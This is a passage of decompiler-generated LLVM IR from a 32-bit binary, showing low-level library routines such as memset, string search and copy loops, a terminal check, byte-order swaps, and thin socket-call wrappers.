  %v0_804f1cb = phi i32 [ %v0_804f1c5, %dec_label_pc_804f1b0 ], [ %v0_804f1cb.pre, %dec_label_pc_804f1c9 ]
  %v2_804f1cb = urem i32 %v0_804f1cb, 2
  %v3_804f1cb = icmp eq i32 %v2_804f1cb, 0
  br i1 %v3_804f1cb, label %dec_label_pc_804f1d0, label %dec_label_pc_804f1cf

dec_label_pc_804f1cf:                             ; preds = %dec_label_pc_804f1cb
  %v0_804f1cf = load i32, i32* %esi.global-to-local, align 4
  %v1_804f1cf = inttoptr i32 %v0_804f1cf to i8*
  %v2_804f1cf = load i8, i8* %v1_804f1cf, align 1
  %v3_804f1cf = load i32, i32* %edi.global-to-local, align 4
  %v4_804f1cf = inttoptr i32 %v3_804f1cf to i8*
  store i8 %v2_804f1cf, i8* %v4_804f1cf, align 1
  %v5_804f1cf = load i32, i32* %edi.global-to-local, align 4
  %v6_804f1cf = load i32, i32* %esi.global-to-local, align 4
  %v9_804f1cf = add i32 %v5_804f1cf, 1
  %v10_804f1cf = add i32 %v6_804f1cf, 1
  store i32 %v9_804f1cf, i32* %edi.global-to-local, align 4
  store i32 %v10_804f1cf, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f1d0

dec_label_pc_804f1d0:                             ; preds = %dec_label_pc_804f1cb, %dec_label_pc_804f1cf
  store i32 %v4_804f1bc, i32* %eax.global-to-local, align 4
  %v2_804f1d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f1d4, i32* @esi, align 4
  ret i32 %v4_804f1bc

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 5, 4, 7, 6 }
  uselistorder label %dec_label_pc_804f1d0, { 1, 0 }
  uselistorder label %dec_label_pc_804f1cb, { 1, 0 }
}

define i32 @function_804f1d8(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f1d8:
  %v0_804f1d8 = load i32, i32* @edi, align 4
  %v4_804f1e1 = ptrtoint i8* %arg1 to i32
  %v5_804f1e5 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_804f1d8, i32* @edi, align 4
  ret i32 %v4_804f1e1

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_804f1f0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f1f0:
  %v4_804f1f1 = ptrtoint i8* %arg1 to i32
  %v2_804f1f9 = mul i32 %arg2, 256
  %v3_804f1f9 = and i32 %v2_804f1f9, 65280
  %v4_804f1f9 = and i32 %arg2, -65281
  %v5_804f1f9 = or i32 %v3_804f1f9, %v4_804f1f9
  br label %dec_label_pc_804f1fb

dec_label_pc_804f1fb:                             ; preds = %dec_label_pc_804f200, %dec_label_pc_804f1f0
  %v4_804f1fb = phi i32 [ %v6_804f1fb, %dec_label_pc_804f200 ], [ %v5_804f1f9, %dec_label_pc_804f1f0 ]
  %v7_804f1fb = phi i32 [ %v10_804f1fb, %dec_label_pc_804f200 ], [ %v4_804f1f1, %dec_label_pc_804f1f0 ]
  %v1_804f1fb = inttoptr i32 %v7_804f1fb to i8*
  %v2_804f1fb = load i8, i8* %v1_804f1fb, align 1
  %v3_804f1fc = udiv i32 %v4_804f1fb, 256
  %v4_804f1fc = trunc i32 %v3_804f1fc to i8
  %v16_804f1fc = icmp eq i8 %v2_804f1fb, %v4_804f1fc
  br i1 %v16_804f1fc, label %dec_label_pc_804f209, label %dec_label_pc_804f200

dec_label_pc_804f200:                             ; preds = %dec_label_pc_804f1fb
  %v10_804f1fb = add i32 %v7_804f1fb, 1
  %v3_804f1fb = zext i8 %v2_804f1fb to i32
  %v5_804f1fb = and i32 %v4_804f1fb, -256
  %v6_804f1fb = or i32 %v3_804f1fb, %v5_804f1fb
  %v4_804f200 = icmp eq i8 %v2_804f1fb, 0
  %v1_804f202 = icmp eq i1 %v4_804f200, false
  br i1 %v1_804f202, label %dec_label_pc_804f1fb, label %dec_label_pc_804f204

dec_label_pc_804f204:                             ; preds = %dec_label_pc_804f200
  br label %dec_label_pc_804f209

dec_label_pc_804f209:                             ; preds = %dec_label_pc_804f1fb, %dec_label_pc_804f204
  %v0_804f209 = phi i32 [ 0, %dec_label_pc_804f204 ], [ %v7_804f1fb, %dec_label_pc_804f1fb ]
  ret i32 %v0_804f209

; uselistorder directives
  uselistorder i8 %v2_804f1fb, { 1, 2, 0 }
  uselistorder i32 %v4_804f1fb, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f209, { 1, 0 }
}

define i32 @function_804f210(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f210:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f211 = load i32, i32* @esi, align 4
  store i32 %v0_804f211, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f219 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f219, i32* %edi.global-to-local, align 4
  %v4_804f21d.pre = load i32, i32* @eax, align 4
  %v1_804f21d10 = inttoptr i32 %arg2 to i8*
  %v2_804f21d11 = load i8, i8* %v1_804f21d10, align 1
  %v3_804f21d12 = zext i8 %v2_804f21d11 to i32
  %v5_804f21d13 = and i32 %v4_804f21d.pre, -256
  %v6_804f21d14 = or i32 %v3_804f21d12, %v5_804f21d13
  store i32 %v6_804f21d14, i32* %eax.global-to-local, align 4
  %v10_804f21d15 = add i32 %arg2, 1
  store i32 %v10_804f21d15, i32* %esi.global-to-local, align 4
  store i8 %v2_804f21d11, i8* %arg1, align 1
  %v4_804f21e17 = load i32, i32* %edi.global-to-local, align 4
  %v7_804f21e18 = add i32 %v4_804f21e17, 1
  store i32 %v7_804f21e18, i32* %edi.global-to-local, align 4
  %v0_804f21f19 = load i32, i32* %eax.global-to-local, align 4
  %v3_804f21f20 = trunc i32 %v0_804f21f19 to i8
  %v4_804f21f21 = icmp eq i8 %v3_804f21f20, 0
  %v1_804f22122 = icmp eq i1 %v4_804f21f21, false
  br i1 %v1_804f22122, label %dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge, label %dec_label_pc_804f223

dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge: ; preds = %dec_label_pc_804f210, %dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge
  %v0_804f21f24 = phi i32 [ %v0_804f21f, %dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge ], [ %v0_804f21f19, %dec_label_pc_804f210 ]
  %v7_804f21e23 = phi i32 [ %v7_804f21e, %dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge ], [ %v7_804f21e18, %dec_label_pc_804f210 ]
  %v0_804f21d.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804f21d = inttoptr i32 %v0_804f21d.pre to i8*
  %v2_804f21d = load i8, i8* %v1_804f21d, align 1
  %v3_804f21d = zext i8 %v2_804f21d to i32
  %v5_804f21d = and i32 %v0_804f21f24, -256
  %v6_804f21d = or i32 %v3_804f21d, %v5_804f21d
  store i32 %v6_804f21d, i32* %eax.global-to-local, align 4
  %v10_804f21d = add i32 %v0_804f21d.pre, 1
  store i32 %v10_804f21d, i32* %esi.global-to-local, align 4
  %v3_804f21e = inttoptr i32 %v7_804f21e23 to i8*
  store i8 %v2_804f21d, i8* %v3_804f21e, align 1
  %v4_804f21e = load i32, i32* %edi.global-to-local, align 4
  %v7_804f21e = add i32 %v4_804f21e, 1
  store i32 %v7_804f21e, i32* %edi.global-to-local, align 4
  %v0_804f21f = load i32, i32* %eax.global-to-local, align 4
  %v3_804f21f = trunc i32 %v0_804f21f to i8
  %v4_804f21f = icmp eq i8 %v3_804f21f, 0
  %v1_804f221 = icmp eq i1 %v4_804f21f, false
  br i1 %v1_804f221, label %dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge, label %dec_label_pc_804f21d.dec_label_pc_804f223_crit_edge

dec_label_pc_804f21d.dec_label_pc_804f223_crit_edge: ; preds = %dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge
  %v2_804f228.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804f223

dec_label_pc_804f223:                             ; preds = %dec_label_pc_804f21d.dec_label_pc_804f223_crit_edge, %dec_label_pc_804f210
  %v2_804f228 = phi i32 [ %v2_804f228.pre, %dec_label_pc_804f21d.dec_label_pc_804f223_crit_edge ], [ %v0_804f211, %dec_label_pc_804f210 ]
  store i32 %v4_804f219, i32* %eax.global-to-local, align 4
  store i32 %v2_804f228, i32* %esi.global-to-local, align 4
  ret i32 %v4_804f219

; uselistorder directives
  uselistorder i32 %v0_804f21f, { 1, 0 }
  uselistorder i32 %v7_804f21e, { 1, 0 }
  uselistorder i32 %v0_804f21d.pre, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 3, 2, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge, { 1, 0 }
}

define i32 @function_804f284(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_804f284:
  %v4_804f28b = ptrtoint i8* %arg2 to i32
  %v2_804f293 = load i8, i8* %arg2, align 1
  %v1_804f296 = icmp eq i8 %v2_804f293, 0
  br i1 %v1_804f296, label %dec_label_pc_804f343, label %dec_label_pc_804f29e

dec_label_pc_804f29e:                             ; preds = %dec_label_pc_804f284
  %v1_804f29e = add i32 %arg1, -1
  br label %dec_label_pc_804f29f

dec_label_pc_804f29f:                             ; preds = %dec_label_pc_804f2ab, %dec_label_pc_804f29e
  %v0_804f29f = phi i32 [ %v1_804f29f, %dec_label_pc_804f2ab ], [ %v1_804f29e, %dec_label_pc_804f29e ]
  %v1_804f29f = add i32 %v0_804f29f, 1
  %v1_804f2a0 = inttoptr i32 %v1_804f29f to i8*
  %v2_804f2a0 = load i8, i8* %v1_804f2a0, align 1
  %v1_804f2a3 = icmp eq i8 %v2_804f2a0, 0
  br i1 %v1_804f2a3, label %dec_label_pc_804f343, label %dec_label_pc_804f2ab

dec_label_pc_804f2ab:                             ; preds = %dec_label_pc_804f29f
  %v12_804f2ab = icmp eq i8 %v2_804f2a0, %v2_804f293
  %v1_804f2ad = icmp eq i1 %v12_804f2ab, false
  br i1 %v1_804f2ad, label %dec_label_pc_804f29f, label %dec_label_pc_804f2af

dec_label_pc_804f2af:                             ; preds = %dec_label_pc_804f2ab
  %v1_804f2af = add i32 %v4_804f28b, 1
  %v2_804f2b6 = inttoptr i32 %v1_804f2af to i8*
  %v3_804f2b6 = load i8, i8* %v2_804f2b6, align 1
  %v1_804f2bd = icmp eq i8 %v3_804f2b6, 0
  br i1 %v1_804f2bd, label %dec_label_pc_804f343, label %dec_label_pc_804f2c1

dec_label_pc_804f2c1:                             ; preds = %dec_label_pc_804f2af
  %v1_804f2c1 = add i32 %v0_804f29f, 2
  %v1_804f302 = add i32 %v4_804f28b, 2
  %v2_804f302 = inttoptr i32 %v1_804f302 to i8*
  br label %dec_label_pc_804f2f4

dec_label_pc_804f2cc:                             ; preds = %dec_label_pc_804f339
  %v2_804f2cc = inttoptr i32 %v0_804f307 to i8*
  %v3_804f2cc = load i8, i8* %v2_804f2cc, align 1
  br label %dec_label_pc_804f2e9.preheader

dec_label_pc_804f2e9.preheader:                   ; preds = %dec_label_pc_804f2cc, %dec_label_pc_804f2f4
  %v0_804f2e911.in = phi i8 [ %v3_804f2cc, %dec_label_pc_804f2cc ], [ %v0_804f2e91128.in, %dec_label_pc_804f2f4 ]
  %v12_804f2e916 = icmp eq i8 %v0_804f2e911.in, %v2_804f293
  %v1_804f2eb18 = icmp eq i1 %v12_804f2e916, false
  br i1 %v1_804f2eb18, label %dec_label_pc_804f2d5, label %dec_label_pc_804f2ed

dec_label_pc_804f2d5:                             ; preds = %dec_label_pc_804f2e9.preheader, %dec_label_pc_804f2e5
  %v0_804f2d9 = phi i32 [ %v1_804f2e5, %dec_label_pc_804f2e5 ], [ %v0_804f307, %dec_label_pc_804f2e9.preheader ]
  %v0_804f2d5.in = phi i8 [ %v2_804f2e6, %dec_label_pc_804f2e5 ], [ %v0_804f2e911.in, %dec_label_pc_804f2e9.preheader ]
  %v1_804f2d5 = icmp eq i8 %v0_804f2d5.in, 0
  br i1 %v1_804f2d5, label %dec_label_pc_804f343, label %dec_label_pc_804f2d9

dec_label_pc_804f2d9:                             ; preds = %dec_label_pc_804f2d5
  %v1_804f2d9 = add i32 %v0_804f2d9, 1
  %v1_804f2da = inttoptr i32 %v1_804f2d9 to i8*
  %v2_804f2da = load i8, i8* %v1_804f2da, align 1
  %v12_804f2dd = icmp eq i8 %v2_804f2da, %v2_804f293
  br i1 %v12_804f2dd, label %dec_label_pc_804f2ed, label %dec_label_pc_804f2e1

dec_label_pc_804f2e1:                             ; preds = %dec_label_pc_804f2d9
  %v1_804f2e1 = icmp eq i8 %v2_804f2da, 0
  br i1 %v1_804f2e1, label %dec_label_pc_804f343, label %dec_label_pc_804f2e5

dec_label_pc_804f2e5:                             ; preds = %dec_label_pc_804f2e1
  %v1_804f2e5 = add i32 %v0_804f2d9, 2
  %v1_804f2e6 = inttoptr i32 %v1_804f2e5 to i8*
  %v2_804f2e6 = load i8, i8* %v1_804f2e6, align 1
  %v12_804f2e9 = icmp eq i8 %v2_804f2e6, %v2_804f293
  %v1_804f2eb = icmp eq i1 %v12_804f2e9, false
  br i1 %v1_804f2eb, label %dec_label_pc_804f2d5, label %dec_label_pc_804f2ed

dec_label_pc_804f2ed:                             ; preds = %dec_label_pc_804f2e5, %dec_label_pc_804f2d9, %dec_label_pc_804f2e9.preheader
  %v0_804f2ed = phi i32 [ %v0_804f307, %dec_label_pc_804f2e9.preheader ], [ %v1_804f2e5, %dec_label_pc_804f2e5 ], [ %v1_804f2d9, %dec_label_pc_804f2d9 ]
  %v1_804f2ed = add i32 %v0_804f2ed, 1
  br label %dec_label_pc_804f2f4

dec_label_pc_804f2f4:                             ; preds = %dec_label_pc_804f2c1, %dec_label_pc_804f2ed
  %v0_804f2e91128.in.in.in = phi i32 [ %v1_804f2ed, %dec_label_pc_804f2ed ], [ %v1_804f2c1, %dec_label_pc_804f2c1 ]
  %v0_804f307 = phi i32 [ %v1_804f2ed, %dec_label_pc_804f2ed ], [ %v1_804f2c1, %dec_label_pc_804f2c1 ]
  %v0_804f2e91128.in.in = inttoptr i32 %v0_804f2e91128.in.in.in to i8*
  %v0_804f2e91128.in = load i8, i8* %v0_804f2e91128.in.in, align 1
  %storemerge4 = icmp eq i8 %v0_804f2e91128.in, %v3_804f2b6
  %v1_804f2f4 = icmp eq i1 %storemerge4, false
  br i1 %v1_804f2f4, label %dec_label_pc_804f2e9.preheader, label %dec_label_pc_804f2f6

dec_label_pc_804f2f6:                             ; preds = %dec_label_pc_804f2f4
  %v1_804f2fe = add i32 %v0_804f307, 1
  %v2_804f2fe = inttoptr i32 %v1_804f2fe to i8*
  %v3_804f2fe = load i8, i8* %v2_804f2fe, align 1
  %v3_804f302 = load i8, i8* %v2_804f302, align 1
  %v1_804f30a = add i32 %v0_804f307, -1
  %v12_804f30d = icmp eq i8 %v3_804f2fe, %v3_804f302
  %v1_804f30f = icmp eq i1 %v12_804f30d, false
  br i1 %v1_804f30f, label %dec_label_pc_804f339, label %dec_label_pc_804f311thread-pre-split

dec_label_pc_804f311thread-pre-split:             ; preds = %dec_label_pc_804f2f6
  %v1_804f3119 = icmp eq i8 %v3_804f2fe, 0
  br i1 %v1_804f3119, label %dec_label_pc_804f343, label %dec_label_pc_804f315

dec_label_pc_804f315:                             ; preds = %dec_label_pc_804f311thread-pre-split, %dec_label_pc_804f335
  %v0_804f328 = phi i32 [ %v1_804f328, %dec_label_pc_804f335 ], [ %v1_804f302, %dec_label_pc_804f311thread-pre-split ]
  %v0_804f325 = phi i32 [ %v1_804f325, %dec_label_pc_804f335 ], [ %v1_804f2fe, %dec_label_pc_804f311thread-pre-split ]
  %v1_804f315 = add i32 %v0_804f325, 1
  %v2_804f315 = inttoptr i32 %v1_804f315 to i8*
  %v3_804f315 = load i8, i8* %v2_804f315, align 1
  %v1_804f319 = add i32 %v0_804f328, 1
  %v2_804f319 = inttoptr i32 %v1_804f319 to i8*
  %v3_804f319 = load i8, i8* %v2_804f319, align 1
  %v12_804f31d = icmp eq i8 %v3_804f315, %v3_804f319
  %v1_804f31f = icmp eq i1 %v12_804f31d, false
  br i1 %v1_804f31f, label %dec_label_pc_804f339, label %dec_label_pc_804f321

dec_label_pc_804f321:                             ; preds = %dec_label_pc_804f315
  %v1_804f321 = icmp eq i8 %v3_804f319, 0
  br i1 %v1_804f321, label %dec_label_pc_804f343, label %dec_label_pc_804f325

dec_label_pc_804f325:                             ; preds = %dec_label_pc_804f321
  %v1_804f325 = add i32 %v0_804f325, 2
  %v1_804f328 = add i32 %v0_804f328, 2
  %v1_804f32b = inttoptr i32 %v1_804f325 to i8*
  %v2_804f32b = load i8, i8* %v1_804f32b, align 1
  %v1_804f32e = inttoptr i32 %v1_804f328 to i8*
  %v2_804f32e = load i8, i8* %v1_804f32e, align 1
  %v12_804f331 = icmp eq i8 %v2_804f32b, %v2_804f32e
  %v1_804f333 = icmp eq i1 %v12_804f331, false
  br i1 %v1_804f333, label %dec_label_pc_804f339, label %dec_label_pc_804f335

dec_label_pc_804f335:                             ; preds = %dec_label_pc_804f325
  %v1_804f311 = icmp eq i8 %v2_804f32e, 0
  br i1 %v1_804f311, label %dec_label_pc_804f343, label %dec_label_pc_804f315

dec_label_pc_804f339:                             ; preds = %dec_label_pc_804f325, %dec_label_pc_804f315, %dec_label_pc_804f2f6
  %v0_804f339.in = phi i8 [ %v3_804f302, %dec_label_pc_804f2f6 ], [ %v2_804f32e, %dec_label_pc_804f325 ], [ %v3_804f319, %dec_label_pc_804f315 ]
  %v1_804f339 = icmp eq i8 %v0_804f339.in, 0
  %v1_804f33b = icmp eq i1 %v1_804f339, false
  br i1 %v1_804f33b, label %dec_label_pc_804f2cc, label %dec_label_pc_804f343

dec_label_pc_804f343:                             ; preds = %dec_label_pc_804f29f, %dec_label_pc_804f311thread-pre-split, %dec_label_pc_804f339, %dec_label_pc_804f321, %dec_label_pc_804f335, %dec_label_pc_804f2d5, %dec_label_pc_804f2e1, %dec_label_pc_804f284, %dec_label_pc_804f2af
  %storemerge2 = phi i32 [ %v1_804f29f, %dec_label_pc_804f2af ], [ %arg1, %dec_label_pc_804f284 ], [ 0, %dec_label_pc_804f2e1 ], [ 0, %dec_label_pc_804f2d5 ], [ %v1_804f30a, %dec_label_pc_804f335 ], [ %v1_804f30a, %dec_label_pc_804f321 ], [ %v1_804f30a, %dec_label_pc_804f339 ], [ %v1_804f30a, %dec_label_pc_804f311thread-pre-split ], [ 0, %dec_label_pc_804f29f ]
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8 %v2_804f32e, { 0, 2, 1 }
  uselistorder i32 %v1_804f328, { 1, 0 }
  uselistorder i32 %v1_804f325, { 1, 0 }
  uselistorder i8 %v3_804f319, { 0, 2, 1 }
  uselistorder i8 %v3_804f2fe, { 1, 0 }
  uselistorder i32 %v0_804f307, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_804f2ed, { 1, 0 }
  uselistorder i8 %v2_804f2e6, { 1, 0 }
  uselistorder i32 %v1_804f2e5, { 0, 2, 1 }
  uselistorder i8 %v2_804f2da, { 1, 0 }
  uselistorder i32 %v1_804f2c1, { 1, 0 }
  uselistorder i32 %v1_804f29f, { 0, 2, 1 }
  uselistorder i8 %v2_804f293, { 1, 2, 0, 3, 4 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f343, { 2, 4, 3, 1, 6, 5, 8, 0, 7 }
  uselistorder label %dec_label_pc_804f315, { 1, 0 }
  uselistorder label %dec_label_pc_804f2f4, { 1, 0 }
  uselistorder label %dec_label_pc_804f2d5, { 1, 0 }
  uselistorder label %dec_label_pc_804f2e9.preheader, { 1, 0 }
}

define i32 @function_804f440(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f440:
  %stack_var_-60 = alloca i32, align 4
  %v3_804f44c = call i32 @function_804f460(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804f451 = icmp eq i32 %v3_804f44c, 0
  %v1_804f453 = zext i1 %v1_804f451 to i32
  ret i32 %v1_804f453
}

define i32 @function_804f460(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804f460:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f460 = load i32, i32* @esi, align 4
  %v0_804f461 = load i32, i32* @ebx, align 4
  store i32 %v0_804f461, i32* %stack_var_-8, align 4
  %v2_804f465 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f465, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804f477 = call i32 @function_804df34(i32 %arg1, i32 21505, i32 %v2_804f465)
  store i32 %v3_804f477, i32* %eax.global-to-local, align 4
  store i32 %v3_804f477, i32* @esi, align 4
  %v1_804f481 = icmp eq i32 %v3_804f477, 0
  %v1_804f483 = icmp eq i1 %v1_804f481, false
  br i1 %v1_804f483, label %dec_label_pc_804f4c8, label %dec_label_pc_804f485

dec_label_pc_804f485:                             ; preds = %dec_label_pc_804f460
  %v3_804f485 = load i32, i32* %stack_var_-44, align 4
  %v1_804f489 = load i32, i32* @ebx, align 4
  %v2_804f489 = inttoptr i32 %v1_804f489 to i32*
  store i32 %v3_804f485, i32* %v2_804f489, align 4
  %v1_804f48f = load i32, i32* @ebx, align 4
  %v2_804f48f = add i32 %v1_804f48f, 4
  %v3_804f48f = inttoptr i32 %v2_804f48f to i32*
  %v1_804f496 = load i32, i32* @ebx, align 4
  %v2_804f496 = add i32 %v1_804f496, 8
  %v3_804f496 = inttoptr i32 %v2_804f496 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804f49d = load i32, i32* @ebx, align 4
  %v2_804f49d = add i32 %v1_804f49d, 12
  %v3_804f49d = inttoptr i32 %v2_804f49d to i32*
  store i32 %tmp3, i32* %v3_804f49d, align 4
  %v4_804f4a0 = zext i8 %tmp to i32
  %v5_804f4a0 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f4a0 = and i32 %v5_804f4a0, -256
  %v7_804f4a0 = or i32 %v6_804f4a0, %v4_804f4a0
  store i32 %v7_804f4a0, i32* %eax.global-to-local, align 4
  %v2_804f4a4 = load i32, i32* @ebx, align 4
  %v3_804f4a4 = add i32 %v2_804f4a4, 16
  %v4_804f4a4 = inttoptr i32 %v3_804f4a4 to i8*
  store i8 %tmp, i8* %v4_804f4a4, align 1
  %v0_804f4a7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f4aa = ptrtoint i32* %stack_var_-27 to i32
  %v0_804f4af = load i32, i32* @ebx, align 4
  %v1_804f4af = add i32 %v0_804f4af, 17
  store i32 %v1_804f4af, i32* %eax.global-to-local, align 4
  %v4_804f4b3 = call i32 @function_8051e00(i32 %v1_804f4af, i32 %v2_804f4aa, i32 19, i32 %v0_804f4a7)
  store i32 %v4_804f4b3, i32* %eax.global-to-local, align 4
  %v3_804f4c0 = inttoptr i32 %v4_804f4b3 to i8*
  %v4_804f4c0 = call i32 @function_804f1d8(i8* %v3_804f4c0, i32 0, i32 13)
  store i32 %v4_804f4c0, i32* %eax.global-to-local, align 4
  %v0_804f4c8.pre = load i32, i32* @esi, align 4
  %v2_804f4cd.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804f4c8

dec_label_pc_804f4c8:                             ; preds = %dec_label_pc_804f460, %dec_label_pc_804f485
  %v2_804f4cd = phi i32 [ %v0_804f461, %dec_label_pc_804f460 ], [ %v2_804f4cd.pre, %dec_label_pc_804f485 ]
  %v0_804f4c8 = phi i32 [ %v3_804f477, %dec_label_pc_804f460 ], [ %v0_804f4c8.pre, %dec_label_pc_804f485 ]
  store i32 %v0_804f4c8, i32* %eax.global-to-local, align 4
  store i32 %v2_804f4cd, i32* @ebx, align 4
  store i32 %v0_804f460, i32* @esi, align 4
  ret i32 %v0_804f4c8

; uselistorder directives
  uselistorder i32 %v0_804f4c8, { 1, 0 }
  uselistorder i32 %v3_804f477, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 4, 5 }
  uselistorder label %dec_label_pc_804f4c8, { 1, 0 }
}

define i32 @function_804f4d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f4d0:
  %v1_804f4d4 = trunc i32 %arg1 to i16
  %v2_804f4d4 = call i16 @llvm.bswap.i16(i16 %v1_804f4d4)
  %v3_804f4d4 = zext i16 %v2_804f4d4 to i32
  ret i32 %v3_804f4d4
}

define i32 @function_804f4dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f4dc:
  %v1_804f4e0 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804f4e0
}

define i32 @function_804f4e3(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f4e3:
  %v1_804f4e7 = trunc i32 %arg1 to i16
  %v2_804f4e7 = call i16 @llvm.bswap.i16(i16 %v1_804f4e7)
  %v3_804f4e7 = zext i16 %v2_804f4e7 to i32
  ret i32 %v3_804f4e7
}

define i32 @function_804f4ef(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f4ef:
  %v1_804f4f3 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804f4f3
}

define i32 @function_804f55c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f55c:
  %stack_var_-4 = alloca i32, align 4
  %v2_804f55f = ptrtoint i32* %stack_var_-4 to i32
  %v2_804f568 = inttoptr i32 %arg1 to i8*
  %v3_804f568 = call i32 @function_8051f58(i8* %v2_804f568, i32 %v2_804f55f)
  %v1_804f573 = icmp eq i32 %v3_804f568, 0
  br i1 %v1_804f573, label %dec_label_pc_804f57b, label %dec_label_pc_804f577

dec_label_pc_804f577:                             ; preds = %dec_label_pc_804f55c
  %v3_804f577 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f57b

dec_label_pc_804f57b:                             ; preds = %dec_label_pc_804f55c, %dec_label_pc_804f577
  %v0_804f57b = phi i32 [ -1, %dec_label_pc_804f55c ], [ %v3_804f577, %dec_label_pc_804f577 ]
  ret i32 %v0_804f57b

; uselistorder directives
  uselistorder label %dec_label_pc_804f57b, { 1, 0 }
}

define i32 @function_804f584(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f584:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804f59f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804f5a6 = call i32 @function_805112c(i32 3, i32 %v2_804f59f)
  ret i32 %v2_804f5a6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804f5dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804f5dc:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804f607 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804f60e = call i32 @function_805112c(i32 15, i32 %v2_804f607)
  ret i32 %v2_804f60e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_804f618(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f618:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804f63b = ptrtoint i32* %stack_var_-16 to i32
  %v2_804f642 = call i32 @function_805112c(i32 10, i32 %v2_804f63b)
  ret i32 %v2_804f642

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_804f64c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f64c:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804f66f = ptrtoint i32* %stack_var_-16 to i32
  %v2_804f676 = call i32 @function_805112c(i32 9, i32 %v2_804f66f)
  ret i32 %v2_804f676

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_804f700(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f700:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804f71b = ptrtoint i32* %stack_var_-12 to i32
  %v2_804f722 = call i32 @function_805112c(i32 1, i32 %v2_804f71b)
  ret i32 %v2_804f722

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_805112c, { 4, 0, 1, 3, 2 }
}

define i32 @function_804f72c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f72c:
